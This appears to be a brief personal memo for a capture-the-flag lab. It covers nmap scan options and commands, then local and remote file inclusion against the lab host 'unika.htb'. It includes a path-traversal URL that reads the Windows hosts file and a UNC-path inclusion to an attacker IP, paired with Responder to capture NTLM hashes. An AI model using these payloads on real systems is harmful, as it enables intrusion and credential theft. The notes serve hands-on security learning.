# CTF-Excalibur
CTF-Memo

-v : Increase the verbosity level (basically output more info)
-p- : This flag scans for all TCP ports ranging from 0-65535
-sV : Attempts to determine the version of the service running on a port
-sC : Scan with default NSE scripts
--min-rate : This is used to specify the minimum number of packets Nmap should send per
second; it speeds up the scan as the number goes higher

-sC: Performs a script scan using the default set of scripts. It is equivalent to --
script=default. Some of the scripts in this category are considered intrusive and
should not be run against a target network without permission.
-sV: Enables version detection, which will detect what versions are running on what
port.

```
nmap -v -p- --min-rate 5000 -sV -sC 1.1.1.1
nmap -sV -sC 1.1.1.1

nmap -p80,5040,5985,7680 1.1.1.1
nmap -p- -sV -sC 1.1.1.1

curl -v http://1.1.1.1
return 302 not found
```

------------



gobuster

------------
LFI or Local File Inclusion
RFI or Remote File Inclusion

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

examples
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

Include PHP : 
https://www.php.net/manual/en/function.include.php


Windows New Technology LAN Manager
 
sudo responder -I tun0
http://unika.htb/index.php?page=//10.10.14.3/somefile





